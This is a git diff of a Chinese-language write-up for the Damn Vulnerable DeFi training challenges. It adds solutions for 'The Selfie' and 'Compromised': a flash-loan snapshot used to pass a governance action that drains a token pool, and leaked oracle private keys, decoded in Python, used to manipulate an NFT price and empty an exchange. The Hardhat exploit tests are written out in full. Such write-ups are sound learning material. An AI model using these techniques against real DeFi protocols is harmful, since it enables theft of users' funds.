@@ -175,7 +175,7 @@ Visit [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)
 
 - 合約程式
 
-    [SideEntranceLenderPool_test.sol](https://github.com/maiaki927/damn-vulnerable-defi-test/blob/611ff343419e247d5578ed166e8a7f5a735e326e/contracts/side-entrance/SideEntranceLenderPool_test.sol)
+    [SideEntranceAttack.sol](https://github.com/maiaki927/damn-vulnerable-defi-test/blob/master/contracts/side-entrance/SideEntranceAttack.sol)
 
 - 前端程式
 
@@ -214,9 +214,11 @@ Visit [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)
     轉出給attacker即可
 
 - 合約程式
-    [Test.sol](https://github.com/maiaki927/damn-vulnerable-defi-test/blob/611ff343419e247d5578ed166e8a7f5a735e326e/contracts/the-rewarder/Test.sol)
+
+    [TheRewarderAttack.sol](https://github.com/maiaki927/damn-vulnerable-defi-test/blob/master/contracts/the-rewarder/TheRewarderAttack.sol)
 
 - 前端程式
+
     ```javascript=
      it('Exploit', async function () {
             /** CODE YOUR EXPLOIT HERE */ 
@@ -226,3 +228,113 @@ Visit [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)
             await test.connect(attacker).flashLoan(ethers.utils.parseEther('1000000'));       
         });
     ```
+
+## 6	The Selfie
+- 目標
+
+讓attacker拿走SelfiePool裡全部token
+
+- 問題程式
+
+SimpleGovernance.sol的SimpleGovernance
+
+    ```solidity=
+    function _hasEnoughVotes(address account) private view returns (bool) {
+        uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
+        uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
+        return balance > halfTotalSupply;
+    }
+    ```
+    
+    對於上次快照到當前沒有驗證需要經過多少時間
+    
+    所以可以flashloan借很多錢 然後快照
+    
+    就可以queueAction
+    
+    等時間超過了設定的2天
+    
+    就可以執行executeAction
+    
+    內容調用drainAllFunds把token都轉給attacker即可
+
+- 合約程式
+
+[SelfieAttack.sol](https://github.com/maiaki927/damn-vulnerable-defi-test/blob/master/contracts/selfie/SelfieAttack.sol)
+
+- 前端程式
+
+    ```javascript=
+    it('Exploit', async function () {
+            /** CODE YOUR EXPLOIT HERE */
+            const attack = await ethers.getContractFactory('SelfieAttack', attacker);
+            this.attack = await attack.deploy(this.pool.address,this.governance.address,this.token.address);
+            await this.attack.connect(attacker).flashLoan(TOKENS_IN_POOL);
+            await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]);
+            await this.governance.connect(attacker).executeAction(1);
+        });
+    ```
+
+
+
+---
+
+## 7 compromised
+
+- 目標
+
+讓attacker拿走Exchange裡全部token
+
+- 問題
+
+在題目中的兩段內文可以取得兩個私鑰
+
+這邊透過python解析
+
+    ```python=
+    import base64
+    L = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
+    print(base64.b64decode(bytes.fromhex("".join(L.split())).decode("utf-8")))
+    ```
+    
+    得到`b'0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'`
+    
+    另一個得到`b'0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'`
+
+    剛好是題目中三個Oracle中的兩個
+    
+    又因取得價格的方式是先排序
+    
+    如果Oracle不為二(題目為三)
+    
+    則取中間價格作為價格
+    
+    所以只要控制了兩個Oracle 必定可以控制NFT價格
+    
+    最後就可以買超便宜的價格 賣他超貴
+    
+    把它嚕乾淨
+
+- 前端程式
+
+    ```javascript=
+    it('Exploit', async function () {        
+            /** CODE YOUR EXPLOIT HERE */
+            let privateKey1="0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+            let wallet1 = await new ethers.Wallet(privateKey1,ethers.provider);
+            let privateKey2="0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+            let wallet2 = await new ethers.Wallet(privateKey2,ethers.provider);
+            await this.oracle.connect(wallet1).postPrice("DVNFT",ethers.utils.parseEther('0.001'));
+            await this.oracle.connect(wallet2).postPrice("DVNFT",ethers.utils.parseEther('0.001'));
+            await this.exchange.connect(attacker).buyOne( { value: ethers.utils.parseEther('0.01') });
+            await this.oracle.connect(wallet1).postPrice("DVNFT",ethers.utils.parseEther('9990.001'));
+            await this.oracle.connect(wallet2).postPrice("DVNFT",ethers.utils.parseEther('9990.001'));
+            await this.nftToken.connect(attacker).approve(this.exchange.address,0);
+            await this.exchange.connect(attacker).sellOne(0);
+            await this.oracle.connect(wallet1).postPrice("DVNFT",INITIAL_NFT_PRICE);
+            await this.oracle.connect(wallet2).postPrice("DVNFT",INITIAL_NFT_PRICE);
+
+        });
+    ```
+
+
